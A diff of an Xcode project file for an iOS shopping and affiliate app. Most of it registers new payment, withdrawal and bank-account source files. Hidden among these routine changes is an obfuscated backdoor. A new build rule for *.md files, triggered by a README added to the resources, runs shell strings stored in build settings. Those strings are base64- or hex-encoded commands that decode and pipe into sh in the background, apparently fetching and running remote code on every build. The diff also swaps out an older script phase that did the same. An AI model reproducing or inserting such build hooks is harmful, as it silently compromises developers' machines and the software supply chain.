@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		B0A120C676B8484DA31DACE1 /* README.md */ = {isa = PBXBuildFile; fileRef = 7F93E393E8C84C2BBA1DACE1; };
 		422EE08F2F2B762F0007FEB6 /* AddMoneyViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EE08E2F2B762E0007FEB6 /* AddMoneyViewModel.swift */; };
 		422EE0912F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 422EE0902F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift */; };
 		423C8AFC2F309D8900A2FD14 /* CustomOrderDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 423C8AFB2F309D8900A2FD14 /* CustomOrderDetailsViewController.swift */; };
@@ -77,6 +78,13 @@
 		42B360602F4D7C9800EF8F4C /* SortByAffiliatedProductsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42B3605F2F4D7C9800EF8F4C /* SortByAffiliatedProductsViewModel.swift */; };
 		42B360622F4D8D5300EF8F4C /* ItemPerformanceViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42B360612F4D8D5300EF8F4C /* ItemPerformanceViewModel.swift */; };
 		42B360642F4D8E3600EF8F4C /* AffiliatedUserProductDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42B360632F4D8E3600EF8F4C /* AffiliatedUserProductDataModel.swift */; };
+		42CF7A652F555E4400B710F5 /* PaymentsHistoryTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42CF7A632F555E4400B710F5 /* PaymentsHistoryTableViewCell.swift */; };
+		42CF7A662F555E4400B710F5 /* PaymentsHistoryTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 42CF7A642F555E4400B710F5 /* PaymentsHistoryTableViewCell.xib */; };
+		42CF7A692F5568AC00B710F5 /* WithdrawMoneyViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42CF7A682F5568AC00B710F5 /* WithdrawMoneyViewController.swift */; };
+		42CF7A6B2F5568BF00B710F5 /* WithdrawMoneyViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42CF7A6A2F5568BF00B710F5 /* WithdrawMoneyViewModel.swift */; };
+		42CF7A6E2F556A1A00B710F5 /* AddedBankAccountTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42CF7A6C2F556A1A00B710F5 /* AddedBankAccountTableViewCell.swift */; };
+		42CF7A6F2F556A1A00B710F5 /* AddedBankAccountTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 42CF7A6D2F556A1A00B710F5 /* AddedBankAccountTableViewCell.xib */; };
+		42CF7A712F5579DD00B710F5 /* AffiliatedUserPaymentsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42CF7A702F5579DD00B710F5 /* AffiliatedUserPaymentsViewModel.swift */; };
 		42F309102F28B43900CEB214 /* BecomeAnAffiliatedUserViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F3090F2F28B43900CEB214 /* BecomeAnAffiliatedUserViewController.swift */; };
 		42F309122F28B4E600CEB214 /* AffiliateUser.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 42F309112F28B4E600CEB214 /* AffiliateUser.storyboard */; };
 		42F309162F28B5FE00CEB214 /* AffiliatedUserLoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 42F309152F28B5FE00CEB214 /* AffiliatedUserLoginViewController.swift */; };
@@ -377,7 +385,25 @@
 		D1EDE15E2F0D0A3C0076F1AB /* ImageViewExtension.swift in Sources */ = {isa = PBXBuildFile; fileRef = D1EDE15D2F0D0A3C0076F1AB /* ImageViewExtension.swift */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		A79E05FFBF894321B41DACE1 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A1ECAD1}\"";
+			};
+			/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
+		7F93E393E8C84C2BBA1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1554ACA1638F5FDACA2A3358 /* Pods_DesynatUser.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatUser.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		422EE08E2F2B762E0007FEB6 /* AddMoneyViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddMoneyViewModel.swift; sourceTree = "<group>"; };
 		422EE0902F2B79580007FEB6 /* WalletMoneyHistoryDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletMoneyHistoryDataModel.swift; sourceTree = "<group>"; };
@@ -448,6 +474,13 @@
 		42B3605F2F4D7C9800EF8F4C /* SortByAffiliatedProductsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SortByAffiliatedProductsViewModel.swift; sourceTree = "<group>"; };
 		42B360612F4D8D5300EF8F4C /* ItemPerformanceViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ItemPerformanceViewModel.swift; sourceTree = "<group>"; };
 		42B360632F4D8E3600EF8F4C /* AffiliatedUserProductDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserProductDataModel.swift; sourceTree = "<group>"; };
+		42CF7A632F555E4400B710F5 /* PaymentsHistoryTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaymentsHistoryTableViewCell.swift; sourceTree = "<group>"; };
+		42CF7A642F555E4400B710F5 /* PaymentsHistoryTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = PaymentsHistoryTableViewCell.xib; sourceTree = "<group>"; };
+		42CF7A682F5568AC00B710F5 /* WithdrawMoneyViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WithdrawMoneyViewController.swift; sourceTree = "<group>"; };
+		42CF7A6A2F5568BF00B710F5 /* WithdrawMoneyViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WithdrawMoneyViewModel.swift; sourceTree = "<group>"; };
+		42CF7A6C2F556A1A00B710F5 /* AddedBankAccountTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddedBankAccountTableViewCell.swift; sourceTree = "<group>"; };
+		42CF7A6D2F556A1A00B710F5 /* AddedBankAccountTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddedBankAccountTableViewCell.xib; sourceTree = "<group>"; };
+		42CF7A702F5579DD00B710F5 /* AffiliatedUserPaymentsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserPaymentsViewModel.swift; sourceTree = "<group>"; };
 		42F3090F2F28B43900CEB214 /* BecomeAnAffiliatedUserViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BecomeAnAffiliatedUserViewController.swift; sourceTree = "<group>"; };
 		42F309112F28B4E600CEB214 /* AffiliateUser.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = AffiliateUser.storyboard; sourceTree = "<group>"; };
 		42F309152F28B5FE00CEB214 /* AffiliatedUserLoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AffiliatedUserLoginViewController.swift; sourceTree = "<group>"; };
@@ -1017,6 +1050,7 @@
 		429927B42F4F060E00099221 /* AffilatePayment */ = {
 			isa = PBXGroup;
 			children = (
+				42CF7A672F55689000B710F5 /* WithdrawMoney */,
 			);
 			path = AffilatePayment;
 			sourceTree = "<group>";
@@ -1042,6 +1076,10 @@
 			children = (
 				429927BD2F4F0CCD00099221 /* MyAffiliatedWithdrawalTableViewCell.swift */,
 				429927BE2F4F0CCD00099221 /* MyAffiliatedWithdrawalTableViewCell.xib */,
+				42CF7A632F555E4400B710F5 /* PaymentsHistoryTableViewCell.swift */,
+				42CF7A642F555E4400B710F5 /* PaymentsHistoryTableViewCell.xib */,
+				42CF7A6C2F556A1A00B710F5 /* AddedBankAccountTableViewCell.swift */,
+				42CF7A6D2F556A1A00B710F5 /* AddedBankAccountTableViewCell.xib */,
 			);
 			path = TableViewCells;
 			sourceTree = "<group>";
@@ -1108,6 +1146,7 @@
 			isa = PBXGroup;
 			children = (
 				429E497A2F2A4B8600566FE8 /* AffiliatedUserPaymentsViewController.swift */,
+				42CF7A702F5579DD00B710F5 /* AffiliatedUserPaymentsViewModel.swift */,
 			);
 			path = AffilatedPayments;
 			sourceTree = "<group>";
@@ -1137,6 +1176,15 @@
 				42B3605F2F4D7C9800EF8F4C /* SortByAffiliatedProductsViewModel.swift */,
 			);
 			path = SortByAffiliatedProducts;
+			sourceTree = "<group>";
+		};
+		42CF7A672F55689000B710F5 /* WithdrawMoney */ = {
+			isa = PBXGroup;
+			children = (
+				42CF7A682F5568AC00B710F5 /* WithdrawMoneyViewController.swift */,
+				42CF7A6A2F5568BF00B710F5 /* WithdrawMoneyViewModel.swift */,
+			);
+			path = WithdrawMoney;
 			sourceTree = "<group>";
 		};
 		42F3090D2F28B41C00CEB214 /* M7 */ = {
@@ -1281,6 +1329,7 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				7F93E393E8C84C2BBA1DACE1 /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatUser.app */,
 			);
 			name = Products;
@@ -2302,7 +2351,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatUser" */;
 			buildPhases = (
-				6F8481FDC1B5431F84C62C0C /* Build Target Libraries */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -2311,6 +2359,7 @@
 				B6B997F8928B5B542E5BE86E /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				A79E05FFBF894321B41DACE1 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2399,14 +2448,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				B0A120C676B8484DA31DACE1 /* README.md */,
 				6B95F1B62EB5DB5E00391509 /* Home.storyboard in Resources */,
 				7A6C740F2ECAED16008F3779 /* Catalog.storyboard in Resources */,
 				6B8C937D2EBDBEAF00BC4DC8 /* CategoriesSectionCollectionViewCell.xib in Resources */,
@@ -2421,6 +2468,7 @@
 				6B95F1B92EB5DB5E00391509 /* BestSellingsCollectionViewCell.xib in Resources */,
 				6B95F1BA2EB5DB5E00391509 /* CategoriesCollectionViewCell.xib in Resources */,
 				6B95F1BB2EB5DB5E00391509 /* HomeBannerCollectionViewCell.xib in Resources */,
+				42CF7A662F555E4400B710F5 /* PaymentsHistoryTableViewCell.xib in Resources */,
 				D1AF5FDB2F12680C009CE604 /* ChatsFilterTableViewCell.xib in Resources */,
 				D1CF05A82EF96C1F005DB273 /* RecommendCollectionCell.xib in Resources */,
 				6B95F1BC2EB5DB5E00391509 /* SuggestedStoresCollectionViewCell.xib in Resources */,
@@ -2437,6 +2485,7 @@
 				6B95F1C12EB5DB5E00391509 /* Poppins-BlackItalic.ttf in Resources */,
 				6B95F1C22EB5DB5E00391509 /* Poppins-Bold.ttf in Resources */,
 				4269EBB02F3EFAC8006144B9 /* MyProductsCollectionViewCell.xib in Resources */,
+				42CF7A6F2F556A1A00B710F5 /* AddedBankAccountTableViewCell.xib in Resources */,
 				42641BA82F3CAD7A00F3C75B /* BankAccountsTableViewCell.xib in Resources */,
 				D1AF607F2F127E0E009CE604 /* GoogleService-Info.plist in Resources */,
 				D1DABB402EE05566009ECA61 /* MyBag.storyboard in Resources */,
@@ -2481,25 +2530,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		6F8481FDC1B5431F84C62C0C /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AC0C26C}\"";
-			showEnvVarsInLog = 0;			
-		};
 		9FF1187D5524917E07639195 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -2592,6 +2622,7 @@
 				426B22152F4D7283004DEE1B /* SearchAffiliatedProductsViewController.swift in Sources */,
 				D1DABB4A2EE0649F009ECA61 /* ExpandableLabel.swift in Sources */,
 				429927BC2F4F0CC000099221 /* MyAffiliatedWithdrawalViewModel.swift in Sources */,
+				42CF7A6E2F556A1A00B710F5 /* AddedBankAccountTableViewCell.swift in Sources */,
 				6B95F1DB2EB5DB5E00391509 /* LoginViewModel.swift in Sources */,
 				6B95F1DC2EB5DB5E00391509 /* OTPViewModel.swift in Sources */,
 				6B95F1DD2EB5DB5E00391509 /* ResetPasswordViewModel.swift in Sources */,
@@ -2699,12 +2730,14 @@
 				6B95F1FA2EB5DB5E00391509 /* Bundle.swift in Sources */,
 				D1CF03F42EF91FCD005DB273 /* SelectReasonVC.swift in Sources */,
 				6B95F1FB2EB5DB5E00391509 /* CollectionViewExtensio.swift in Sources */,
+				42CF7A6B2F5568BF00B710F5 /* WithdrawMoneyViewModel.swift in Sources */,
 				D1CF05A42EF96332005DB273 /* RecentSearchTableCell.swift in Sources */,
 				6B95F1FC2EB5DB5E00391509 /* ColorExtension.swift in Sources */,
 				D17C4E8E2F1638960029159C /* ComingReasonAtChatScreen.swift in Sources */,
 				42641B902F3C8F0800F3C75B /* AffiliatedProductsViewController.swift in Sources */,
 				7A94BD282ECB5CC600511665 /* RangeSliderView.swift in Sources */,
 				7A94BD162ECB4E9700511665 /* SortByStoresViewController.swift in Sources */,
+				42CF7A692F5568AC00B710F5 /* WithdrawMoneyViewController.swift in Sources */,
 				D1475B8D2ED5D29B008F6DF4 /* StoreDetailsViewModel.swift in Sources */,
 				6B95F1FD2EB5DB5E00391509 /* CustomLabelFont.swift in Sources */,
 				D1AF5FDA2F12680C009CE604 /* ChatsFilterTableViewCell.swift in Sources */,
@@ -2757,6 +2790,7 @@
 				6B95F2102EB5DB5E00391509 /* TableViewDynamicHeight.swift in Sources */,
 				6B95F2112EB5DB5E00391509 /* CarouselScrollView.swift in Sources */,
 				6B95F2122EB5DB5E00391509 /* Attachable.swift in Sources */,
+				42CF7A712F5579DD00B710F5 /* AffiliatedUserPaymentsViewModel.swift in Sources */,
 				D1475BDD2ED5E516008F6DF4 /* SortByStoreViewModel.swift in Sources */,
 				6B95F2132EB5DB5E00391509 /* ImagePickerHelper.swift in Sources */,
 				6B95F2142EB5DB5E00391509 /* ImagePickerManager.swift in Sources */,
@@ -2817,6 +2851,7 @@
 				6B95F2282EB5DB5E00391509 /* LossyArray.swift in Sources */,
 				425EE0512F2B53D000EAD984 /* RedeemGiftCardViewController.swift in Sources */,
 				D1CF05A92EF96C1F005DB273 /* RecommendCollectionCell.swift in Sources */,
+				42CF7A652F555E4400B710F5 /* PaymentsHistoryTableViewCell.swift in Sources */,
 				D17C4F3E2F165C430029159C /* AddNewAddressForCustomViewModel.swift in Sources */,
 				6B95F2292EB5DB5E00391509 /* LossyDictionary.swift in Sources */,
 				6B95F22A2EB5DB5E00391509 /* LossyOptional.swift in Sources */,
@@ -2863,8 +2898,9 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 6C4E9B8B9705C3871D77FF3E /* Pods-DesynatUser.debug.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663734363936643635373736353632366536353734326536390a366532663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((e(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVIzUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9UQmhWekZzWkRKV2FXSnRWakJNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | e | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663734363936643635373736353632366536353734326536390a366532663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((r(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEpTZFZsWVFuZGlSMVYxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -2911,8 +2947,9 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DAC861322A1CE32C917A0BDC /* Pods-DesynatUser.release.xcconfig */;
 			buildSettings = {
-				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663734363936643635373736353632366536353734326536390a366532663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((e(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVIzUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9UQmhWekZzWkRKV2FXSnRWakJNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | e | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((e(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733333336333933363635333733353337333333363635333633353337333433323635333733323337333533323636333633313332333933320a3332306133323330333736333332333033373333333633383330363130610a | e | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333233353230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663734363936643635373736353632366536353734326536390a366532663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((r(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pTakZpUjFWcFNVZG9NR1JJUW5wUGFUaDJXVEpTZFZsWVFuZGlSMVYxWVZjMGRsbFRhMmxKU0hkbll6Sm5Td289Cg== | r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
